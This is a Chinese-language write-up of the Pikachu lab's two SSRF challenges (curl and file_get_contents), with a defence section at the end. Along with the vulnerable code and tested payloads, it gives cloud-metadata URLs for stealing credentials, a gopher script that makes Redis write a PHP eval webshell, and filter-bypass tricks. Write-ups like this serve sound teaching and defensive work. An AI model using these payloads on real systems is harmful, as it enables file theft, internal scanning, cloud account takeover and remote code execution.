---
layout: post
title: Pikachu - SSRF Writeup（curl 与 file_get_contents 两种实现）
platform: pikachu
date: 2026-10-29 21:00:00 +0800
categories: CTF
---

Pikachu - SSRF Writeup（curl 与 file_get_contents 两种实现）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SSRF → SSRF(curl) / SSRF(file_get_content)
- 地址：
  - `http://localhost/pikachu/vul/ssrf/ssrf_curl.php`
  - `http://localhost/pikachu/vul/ssrf/ssrf_fgc.php`
- 题型：Web
- 考点：**SSRF（服务端请求伪造）**、协议差异、内网探测

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
allow_url_fopen = On
模块目录：D:\phpstudy_pro\WWW\pikachu\vul\ssrf\
    ssrf.php        概述页
    ssrf_curl.php   ★ 用 curl_exec 的 SSRF
    ssrf_fgc.php    ★ 用 file_get_contents 的 SSRF
    ssrf_info\
        info1.php   内网服务示例（普希金《假如生活欺骗了你》）
        info2.php   内网服务示例（艾青《我爱这土地》）
```

**页面形态**：

```text
SSRF(curl)：
    [ 请输入URL ]  [提交]

SSRF(file_get_content)：
    [ 请输入URL ]  [提交]
```

**作者提示**：

| 页面 | 提示 |
|---|---|
| SSRF(curl) | `先了解一下php中curl相关函数的用法吧` |
| SSRF(file_get_content) | `先了解一下file_get_contents()相关函数的用法吧` |

**✅ 实测结果（10 种 payload）**

**curl 版（`?url=`）**：

| # | payload | 结果 |
|---|---|---|
| 1 | **`file:///C:/Windows/win.ini`** | **✅ 输出 win.ini 全文** |
| 2 | **`http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php`** | **✅ 输出"假如生活欺骗了你"（普希金）** |
| 3 | `http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php` | ✅ 输出"我爱这土地"（艾青）|
| 4 | `http://127.0.0.1:80/` | ✅ 输出 pikachu 首页 HTML |
| 5 | **`dict://127.0.0.1:3306/`** | **✅ 输出 MySQL banner：`5.7.26` + `mysql_native_password`** |
| 6 | `http://127.0.0.1:9999/` | 空（端口关闭）|

**file_get_contents 版（`?file=`）**：

| # | payload | 结果 |
|---|---|---|
| 7 | **`file:///C:/Windows/win.ini`** | **✅ 输出 win.ini** |
| 8 | **`php://filter/convert.base64-encode/resource=ssrf_fgc.php`** | **✅ 输出 base64 → 解码得源码** |
| 9 | **`http://127.0.0.1/pikachu/.../info1.php`** | **✅ 输出普希金的诗（SSRF）** |
| 10 | **`data://text/plain,SSRF_DATA_OK`** | **✅ 输出 `SSRF_DATA_OK`** |

二、题目分析

**① 什么是 SSRF**

**★ 定义**：

```
SSRF = Server-Side Request Forgery（服务端请求伪造）

服务器有一个"根据用户给的 URL 去请求"的功能
且没有限制"能请求哪里"
→ 攻击者可以让【服务器】去请求【任意地址】

★ 关键词："服务器替你去请求"
★ 所以能"借用服务器的网络位置"访问内网
```

**★ 一个直观的比喻**：

```
你被关在门外（外网），进不去公司（内网）
但你找到一个"前台"（有 SSRF 的服务器）
跟前台说："帮我去 3 楼财务室拿份文件"
前台真的去拿了，还念给你听

★ 前台 = 有 SSRF 的服务器
★ 3 楼财务室 = 内网服务
★ "念给你听" = 响应被回显
```

**② 两个页面的代码对比**

**`ssrf_curl.php`（用 curl）**：

```php
<?php
// 第 27-40 行
if(isset($_GET['url']) && $_GET['url'] != null){
    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);                        // ★ 用用户给的 URL 初始化
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);                       // ★ 执行请求
    curl_close($CH);
//除了http/https外,curl还支持一些其他的协议 curl --version 可以查看其支持的协议,telnet
//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
    echo $RES;                                   // ★ 结果回显
}
?>
```

**`ssrf_fgc.php`（用 file_get_contents）**：

```php
<?php
// 第 23-30 行
//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
//内网请求:http://x.x.x.x/xx.index
if(isset($_GET['file']) && $_GET['file'] !=null){
    $filename = $_GET['file'];
    $str = file_get_contents($filename);         // ★ 用用户给的路径读取
    echo $str;                                   // ★ 结果回显
}
?>
```

**★ 两个页面的共同点**：

```
① 参数完全可控（url / file）
② 后端"真的去请求"了
③ 结果"原样回显"给前端
★ 三个条件都满足 → 有回显的 SSRF（最好利用的一种）
```

**③ 关键差异：两个函数支持的协议不一样**

**★ 这是本模块的重点。**

**`curl` 支持的协议**（`curl --version` 可查）：

```
dict  file  ftp  ftps  gopher  gophers  http  https
imap  imaps  ldap  ldaps  mqtt  pop3  pop3s  rtmp
rtsp  scp  sftp  smb  smbs  smtp  smtps  telnet  tftp
```

**★ `file_get_contents` 支持的协议**：

```
file   http   https   ftp   ftps   php   data   compress.zlib
phar   glob   zip   ssh2（需扩展）  ...
★ 受 allow_url_fopen 限制（http/https/ftp 需要它=On）
```

**★ 实测能用的协议对照**：

| 协议 | curl 版 | file_get_contents 版 | 用途 |
|---|---|---|---|
| `file://` | ✅ | ✅ | 读本地文件 |
| `http://` `https://` | ✅ | ✅ | 内网/外网请求 |
| **`dict://`** | ✅ | ❌ | **端口探测（能拿 banner）** |
| **`gopher://`** | ✅ | ❌ | **构造任意 TCP 包（打 Redis 等）** |
| `php://filter` | ⚠️ 部分 | ✅ | **读 PHP 源码** |
| `data://` | ❌ | ✅ | 内联数据 |
| `ftp://` `telnet://` | ✅ | ⚠️ 部分 | 探测/攻击 |
| `ldap://` `smb://` | ✅ | ❌ | 内网渗透 |

**★ 一句话**：

```
curl 支持的协议【更多】（特别是 gopher/dict → 能打 Redis / 探端口）
file_get_contents 的"读文件"能力更强（php://filter 更稳）
★ 所以"哪个更能打"，取决于要干什么
```

**④ 为什么"回显"这么重要**

**★ 本关的两个页面都 `echo` 了结果**：

```php
echo $RES;      // curl
echo $str;      // file_get_contents
```

**★ 有回显 → 能直接看到内网服务的响应**：

```
① 读文件 → 直接看到文件内容
② 请求内网 → 直接看到内网页面的 HTML
③ 探测端口 → 直接看到 banner（就像 MySQL 那条）
★ 这是"最好利用"的 SSRF
```

**★ 如果没回显（盲 SSRF）**：

```
只能靠"时间差 / 报错差异 / 带外请求"来判断
★ 难度大很多（下面延伸知识会讲）
```

**⑤ 内网服务示例：那两首诗不是随便写的**

**★ `ssrf_info/info1.php`**：

```php
$html = <<<A
<br>
<pre>
假如生活欺骗了你

作者：普希金
...
A;
echo $html;
```

**★ `ssrf_info/info2.php`**：

```php
$html = <<<A
<br>
<pre>
我爱这土地—艾青
...
A;
echo $html;
```

**★ 这两个文件的"用途"**：

```
它们模拟"内网服务"
    · 正常情况下，外网访问不到
    · 但通过 SSRF，服务器能访问它们 → 把内容回显给你
★ 这就是"SSRF 能读内网"的直观演示
```

**★ 实测**：

```
?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
→ 页面出现"假如生活欺骗了你"
★ 证明：服务器真的替我们去请求了 127.0.0.1
```

三、解题步骤

**第 1 步：curl 版 —— 读系统文件**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/win.ini
```

**★ 预期**：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**★ 说明**：

```
curl 支持 file:// 协议
→ 服务器真的去读了本地文件
→ 把内容回显给你
★ 这是"任意文件读取"
```

**第 2 步：⭐ curl 版 —— 请求内网服务（SSRF 的核心）**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

**★ 预期**：

```
假如生活欺骗了你
作者：普希金
假如生活欺骗了你，
不要悲伤，不要心急！
...
```

**★ 这就是 SSRF 的本质**：

```
你（外网）→ 服务器（有 SSRF）→ 127.0.0.1（内网）
              ↑
         "替你去请求"
★ 127.0.0.1 是"内网地址"，外网直接访问不到
★ 但服务器能访问 → 把结果给你
```

**第 3 步：⭐ curl 版 —— 端口探测（dict 协议）**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306/
```

**★ 预期**（页面出现乱码 + 关键信息）：

```
J...5.7.26...mysql_native_password...08S01Got packets out of order
    └──┬──┘ └─────────┬─────────┘
   MySQL 版本      认证方式
```

**★ 为什么 `dict://` 能"探端口"？**

```
dict 协议是最简单的"文本协议"
curl 用它连上端口后，会把对方发的"原始数据"返回
→ 对于 MySQL，对方会先发"握手包"（含版本号）
→ 你就拿到了 banner
★ 这叫"banner grabbing"（ banner 抓取）
```

**★ 端口探测的三种判断方法**：

```
① 有 banner        → 端口开放（如 3306 的 MySQL）
② 有 HTTP 响应     → 端口开放（如 80 的 Apache）
③ 空 / 报错 / 超时 → 端口关闭
```

**★ 试更多端口**：

```
?url=dict://127.0.0.1:22/       → SSH（可能有 SSH-2.0-OpenSSH 之类）
?url=dict://127.0.0.1:3306/     → MySQL
?url=dict://127.0.0.1:6379/     → Redis（可能返回 -ERR 或 info）
?url=dict://127.0.0.1:80/       → HTTP（会返回 400 Bad Request）
```

**第 4 步：file_get_contents 版 —— 读 PHP 源码**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/convert.base64-encode/resource=ssrf_fgc.php
```

**★ 页面出现一长串 base64。**

**★ 解码（PowerShell）**：

```powershell
$b64 = "把页面上的那串粘进来"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
```

**★ 或者 Python**：

```python
import base64
print(base64.b64decode("那串").decode())
```

**★ 解码后**：

```php
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */
...
```

**★ 为什么能读源码？**

```
php://filter 是"过滤器"协议
→ convert.base64-encode 把文件内容编码成 base64
→ echo 出来就是 base64 字符串
→ 不会被"当 PHP 执行"
★ 这和第 29 关（文件包含）用的是同一个技巧
```

**第 5 步：file_get_contents 版 —— 请求内网 + data 协议**

**★ 请求内网**：

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

**★ 输出普希金的诗。**

**★ data 协议（内联数据）**：

```
http://localhost/pikachu/vul/ssrf/ssrf_fgc.php?file=data://text/plain,SSRF_DATA_OK
```

**★ 输出 `SSRF_DATA_OK`。**

**★ data 协议的用途**：

```
· 不需要外部服务器就能"构造内容"
· 在"盲 SSRF"里可以用来"测试是否有回显"
· 也能用作"钓鱼/伪造响应"
```

**第 6 步：完整 payload 汇总**

```
// ========== curl 版（?url=）==========
file:///C:/Windows/win.ini
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
http://127.0.0.1:80/
dict://127.0.0.1:3306/
gopher://127.0.0.1:6379/_...        （打 Redis，见延伸知识）

// ========== file_get_contents 版（?file=）==========
file:///C:/Windows/win.ini
php://filter/convert.base64-encode/resource=ssrf_fgc.php
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
data://text/plain,SSRF_DATA_OK
```

四、延伸知识

**① SSRF 的五种利用方向**

**方向 1：读本地文件**

```
file:///etc/passwd              （Linux）
file:///C:/Windows/win.ini      （Windows）
php://filter/convert.base64-encode/resource=config.php
```

**方向 2：内网端口扫描**

```
dict://127.0.0.1:22/
dict://192.168.1.1:3306/
★ 看"有没有响应"判断端口开放
★ 看"banner"判断服务类型
```

**方向 3：攻击内网应用**

```
· 访问内网的 Redis → gopher 构造命令 → 写文件 / 反弹 shell
· 访问内网的 MySQL → 无密码 root → 拖库
· 访问内网的 Jenkins / RabbitMQ / 未授权接口
· 访问内网的"管理后台"（通常只在内网开放）
```

**方向 4：云环境元数据（最值钱）**

```
http://169.254.169.254/latest/meta-data/           （AWS）
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/ （GCP）
http://100.100.100.200/latest/meta-data/           （阿里云）
```

**★ 能拿到什么**：

```
· 实例 ID、内网 IP、区域
· 临时 AK/SK（AccessKey / SecretKey）
· user-data（启动脚本，可能含密码）
★ 拿到 AK/SK → 接管整个云账号
★ Capital One 事件（1 亿用户数据）就是这么打的
```

**方向 5：探测内网拓扑**

```
· 内网网段扫描：http://192.168.1.1/ ~ 192.168.1.254
· 判断"哪些服务活着"
· 为下一步渗透做准备
```

**② ⭐ gopher 协议：SSRF 的"终极武器"**

**★ 为什么 gopher 最强？**

```
gopher:// 能"发送任意 TCP 数据包"
→ 也就是说：可以用它"手工构造"任何协议的请求
→ Redis / MySQL / FastCGI / SMTP ... 都能打
★ 这是 SSRF 从"读"升级到"打"的关键
```

**★ gopher 的语法**：

```
gopher://<host>:<port>/_<URL编码后的数据>

★ 注意：
   · 端口后必须有 /_
   · 数据要 URL 编码（特别是 \r\n → %0d%0a）
```

**★ 经典利用 1：打 Redis 写 webshell**

**★ Redis 未授权时的攻击链**：

```
① CONFIG SET dir /var/www/html/        设置工作目录
② CONFIG SET dbfilename shell.php      设置文件名
③ SET x "<?php @eval($_POST[1]);?>"    写入内容
④ SAVE                                 保存（落盘）
→ /var/www/html/shell.php 生成
```

**★ 用 gopher 构造**：

```python
# payload 里的 \r\n 是 Redis 协议的"分隔符"
payload = """CONFIG SET dir /var/www/html/\r
CONFIG SET dbfilename shell.php\r
SET x "<?php @eval($_POST[1]);?>"\r
SAVE\r
"""

# URL 编码（gopher 需要）
import urllib.parse
enc = urllib.parse.quote(payload, safe='')
url = "gopher://127.0.0.1:6379/_" + enc
print(url)
```

**★ 输出形如**：

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%2F%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0A...
```

**★ 用它打目标**：

```
?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20...
→ 目标服务器替你执行 Redis 命令
→ webshell 落地 → getshell
```

**★ 为什么这招厉害？**

```
Redis 默认"无密码"（很多内网实例）
且"只监听内网"（外网连不上）
→ 正常情况下打不到
→ 但 SSRF 能"从内网打内网" → 绕过限制
```

**★ 经典利用 2：打 FastCGI（PHP-FPM）**

```
gopher 构造 FastCGI 的二进制协议
→ 让 PHP-FPM 执行任意 PHP 代码
★ 这是"SSRF → RCE"的另一种方式
★ 工具：Gopherus（自动生成 payload）
```

**★ 经典利用 3：打 MySQL**

```
gopher 构造 MySQL 的握手 + 认证包
→ 如果 MySQL 是"无密码 root"，直接登录
→ 执行 SQL → 读写文件
```

**★ 一个"实际"的提醒**：

```
· gopher 在 curl 7.66+ 里被"默认禁用"了（需要 --proto 显式开启）
· 但很多应用没限制 → 依然可用
· 本关 curl 版本较老 → gopher 可用
```

**③ SSRF 的八种绕过技巧**

**★ 很多防护会"过滤内网地址"，以下是绕过的思路。**

**绕过 1：IP 的"变形写法"**

```
127.0.0.1        → 正常
127.1            → 简写
0x7f.0.0.1       → 十六进制
0177.0.0.1       → 八进制
2130706433       → 十进制整数
127.0.0.1.       → 结尾加点
```

**★ 原理**：

```
很多"正则过滤 127.0.0.1"的代码，认不出这些变形
★ 但操作系统的解析器都认
```

**绕过 2：`@` 混淆**

```
http://expected.com@evil.com/
★ 有些正则匹配"包含 expected.com" → 放过
★ 实际主机是 evil.com
```

**绕过 3：302 跳转**

```
① 传一个"你自己的服务器"地址（不在黑名单）
   http://your-server.com/redirect
② 你的服务器返回：
   HTTP/1.1 302 Found
   Location: http://127.0.0.1/
③ 目标服务器"跟着跳转" → 请求了内网
★ 很多 SSRF 只校验"第一次请求的地址"
```

**绕过 4：DNS 重绑定**

```
① 你控制一个域名 evil.com
② 第一次解析 → 返回"公网 IP"（通过校验）
③ 第二次解析 → 返回 127.0.0.1（攻击时）
★ 利用"校验"和"实际请求"的时间差
```

**绕过 5：短链接**

```
http://t.cn/xxx  →  302 到内网
★ 同上，利用 302
```

**绕过 6：进制/IPv6**

```
http://[::1]/           → IPv6 本地环回
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

**绕过 7：URL 编码 / 双重编码**

```
http://127.0.0.1  →  http://%31%32%37.0.0.1
```

**绕过 8：域名指向内网**

```
把 evil.com 的 A 记录设成 127.0.0.1
→ 校验时"不是内网 IP 字面量" → 放过
→ 实际请求解析到 127.0.0.1
```

**④ 盲 SSRF（没有回显）怎么打**

**★ 如果 `echo` 被去掉，或者结果不返回**：

**方法 1：看响应时间**

```
?url=http://127.0.0.1:80/       → 快（端口开放）
?url=http://127.0.0.1:9999/     → 慢（连接超时）
★ 用"耗时"判断端口是否开放
```

**方法 2：看报错**

```
?url=http://127.0.0.1:3306/     → 报"不是 HTTP 响应"
?url=http://127.0.0.1:9999/     → 报"连接超时"
★ 不同的报错 = 不同的服务
```

**方法 3：带外（OOB）**

```
?url=http://your-server.com/probe
→ 如果你的服务器收到请求 → "能外连"
→ 确认 SSRF 存在
★ 然后可以配合 gopher/dict 做"盲打"
```

**方法 4：DNS 日志**

```
?url=http://random.你的域名.com
→ 看 DNS 服务器日志里有没有这次解析
★ 连"TCP 连接"都不需要，纯 DNS 就能确认
```

**⑤ 防御（五层）**

**❌ 本关的反面教材**：

```php
$URL = $_GET['url'];
$CH = curl_init($URL);
echo curl_exec($CH);
```

**✅ 第 1 层：不用"用户输入的 URL"（根本）**

```php
// ❌ 危险
$url = $_GET['url'];
file_get_contents($url);

// ✅ 如果只是"取某个固定接口"，写死
$url = "https://api.example.com/data";
file_get_contents($url);

// ✅ 如果确实需要"动态地址"，用"ID → 地址"映射
$map = ['1' => 'https://api.example.com/a', '2' => 'https://api.example.com/b'];
$url = $map[$_GET['id']] ?? die('非法');
```

**★ 原则**：

```
"能不让用户控制 URL，就别让"
★ 映射表 > 白名单 > 黑名单
```

**✅ 第 2 层：白名单（域名 + 端口 + 协议）**

```php
$url = $_GET['url'];
$parsed = parse_url($url);

// ① 协议白名单
if (!in_array(strtolower($parsed['scheme'] ?? ''), ['http', 'https'], true)) {
    die('非法协议');
}

// ② 域名白名单（精确匹配）
if (!in_array(strtolower($parsed['host'] ?? ''), ['api.example.com'], true)) {
    die('非法域名');
}

// ③ 端口白名单
if (!in_array($parsed['port'] ?? 80, [80, 443], true)) {
    die('非法端口');
}
```

**★ 注意"DNS 重绑定"**：

```
域名校验通过 ≠ 解析出来就是那个 IP
★ 所以"只校验域名"还不够
★ 要在"真正请求前"再解析一次 IP，并检查 IP 不是内网
```

**✅ 第 3 层：禁止内网 IP（但只作为"辅助"）**

```php
$ip = gethostbyname($parsed['host']);

// 用 filter_var 判断是否"私有地址"
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('禁止访问内网地址');
}
```

**★ 为什么只是"辅助"？**

```
· 过滤 IP 段能被"变形写法"绕过（0x7f.0.0.1 等）
· 能被"DNS 重绑定"绕过
· 能被"302 跳转"绕过
★ 所以必须和"白名单"配合
```

**✅ 第 4 层：限制 curl 的能力**

```php
$CH = curl_init($url);

curl_setopt($CH, CURLOPT_FOLLOWLOCATION, false);        // ★ 禁止跟随跳转（防 302）
curl_setopt($CH, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);   // ★ 只允许 http/https
curl_setopt($CH, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($CH, CURLOPT_TIMEOUT, 5);                   // ★ 超时（防"时间盲注"）
curl_setopt($CH, CURLOPT_MAXREDIRS, 0);                 // ★ 不允许重定向
```

**★ 关键的三行**：

```
CURLOPT_PROTOCOLS    → 禁掉 gopher / dict / file / ftp
CURLOPT_FOLLOWLOCATION → 禁掉 302 绕过
CURLOPT_TIMEOUT      → 禁掉"用时间做盲注"
```

**✅ 第 5 层：网络层隔离（架构层面）**

```
· Web 服务器放在"DMZ 区"，不能随便访问内网
· 内网服务"只允许必要的来源 IP"
· 云环境"关闭 IMDSv1"，强制使用 IMDSv2（需要 token）
  ★ 这样即使 SSRF 也拿不到元数据
```

**★ 这层是"最后一道防线"**：

```
代码层面的防护（白名单）可能被绕过
但"网络隔离"是硬的
★ 即使 SSRF 存在，也"打不到内网"
```

**⑥ 本环境的一个"局限"**

**★ 实测说明**：

```
① curl 版能读 win.ini（file://）
② curl 版能请求 127.0.0.1（SSRF）
③ curl 版能拿 MySQL banner（dict://）
④ file_get_contents 版能读源码（php://filter）
⑤ file_get_contents 版能请求内网（http://）
★ 但 gopher:// 未实测（本关 curl 版本可能禁了，也可能没试）
```

**★ 如果要试 gopher**：

```
?url=gopher://127.0.0.1:6379/_INFO%0D%0A
★ 如果 Redis 开着且未授权 → 会返回 Redis 的 INFO 输出
★ 本环境没装 Redis → 会连接失败
```

**★ 本环境的"内网服务"是模拟的**：

```
ssrf_info/info1.php 和 info2.php
→ 就是两个"正常的 PHP 页面"
→ 它们的意义是"在 127.0.0.1 上，外网访问不到，但 SSRF 能访问"
★ 如果要"真实"的内网服务，可以自己起一个（如 python -m http.server）
```

五、总结

- **本题核心：`curl_init($_GET['url'])` 和 `file_get_contents($_GET['file'])` 直接使用用户输入 → 服务器替攻击者请求任意地址（SSRF），且结果回显。**

- **两段关键代码**：

```php
// ssrf_curl.php
$URL = $_GET['url'];
$CH = curl_init($URL);
echo curl_exec($CH);        // ★ 用户控制 URL，结果回显

// ssrf_fgc.php
$filename = $_GET['file'];
$str = file_get_contents($filename);
echo $str;                  // ★ 同样的问题
```

- **⭐ 八个必记要点**：

```text
① SSRF = "服务器替你去请求"
   关键词：内网访问、借用服务器网络位置
   ★ 三个条件：参数可控 + 真去请求 + 结果回显

② 两个函数的协议差异
   curl：file / http / dict / gopher / ftp / ldap / smb ...
   file_get_contents：file / http / ftp / php / data ...
   ★ curl 的 gopher/dict 是"攻击利器"

③ dict:// 能拿 banner → 端口探测
   dict://127.0.0.1:3306/ → 5.7.26 + mysql_native_password
   ★ 看"有没有响应"判断端口开放

④ gopher:// 是"终极武器"
   能发任意 TCP 包 → 打 Redis / FastCGI / MySQL
   ★ SSRF 从"读"升级到"打"的关键
   ★ 语法：gopher://host:port/_<URL编码的数据>

⑤ 读 PHP 源码用 php://filter
   php://filter/convert.base64-encode/resource=xxx.php
   ★ 这个技巧在文件包含、XXE、SSRF 里通用

⑥ 云环境元数据最值钱
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ★ 拿到临时 AK/SK → 接管云账号

⑦ 八种绕过：IP 变形 / @ / 302 / DNS 重绑定 / 短链 / IPv6 / 编码 / 域名指向内网
   ★ 只过滤 "127.0.0.1" 字面量必被绕

⑧ 防御：不用用户 URL（根本）> 白名单 > 禁内网 IP > curl 限协议 > 网络隔离
   ★ 代码层白名单可能被绕，网络隔离是硬的
```

- **实测数据**：

```text
【curl 版】
file:///C:/Windows/win.ini
    → [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
    → 假如生活欺骗了你（普希金）
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
    → 我爱这土地（艾青）
http://127.0.0.1:80/
    → Pikachu 漏洞练习平台首页 HTML
dict://127.0.0.1:3306/
    → 5.7.26 + mysql_native_password + 08S01Got packets out of order
http://127.0.0.1:9999/
    → 空（端口关闭）

【file_get_contents 版】
file:///C:/Windows/win.ini
    → [fonts] ... MAPI=1
php://filter/convert.base64-encode/resource=ssrf_fgc.php
    → base64 → 解码得源码
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
    → 普希金的诗
data://text/plain,SSRF_DATA_OK
    → SSRF_DATA_OK
```

- **进度**：

```text
platform: pikachu   42 篇（本地 108 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
├── PHP 反序列化        1/1    ✅
├── XXE                 1/1    ✅
├── URL 重定向          1/1    ✅
└── SSRF                1/1    ✅  ← 刚完成
```

**手工复现要点**：

```text
· ssrf_curl.php?url=file:///C:/Windows/win.ini → 读 win.ini
· ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php → 普希金
· ssrf_curl.php?url=dict://127.0.0.1:3306/ → MySQL banner（5.7.26）
· ssrf_fgc.php?file=php://filter/convert.base64-encode/resource=ssrf_fgc.php → 源码
· ssrf_fgc.php?file=data://text/plain,SSRF_DATA_OK → SSRF_DATA_OK
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  SSRF = "让服务器替你去请求"                                   │
│                                                            │
│  ?url=http://127.0.0.1/内网页面   → 内网内容回显               │
│  ?url=file:///C:/Windows/win.ini  → 读本地文件                │
│  ?url=dict://127.0.0.1:3306/      → 端口探测（拿 banner）      │
│  ?url=gopher://127.0.0.1:6379/_.. → 打 Redis（终极武器）       │
│                                                            │
│  ★ curl 支持 gopher/dict（能"打"），file_get_contents 不行      │
│  ★ 云环境打 169.254.169.254 → 拿 AK/SK → 接管云账号              │
│  ★ 只过滤 127.0.0.1 必被绕（IP 变形/302/DNS 重绑定）             │
│                                                            │
│  防御：不用用户 URL（根本）> 白名单 > curl 限协议 > 网络隔离      │
└────────────────────────────────────────────────────────────┘
```
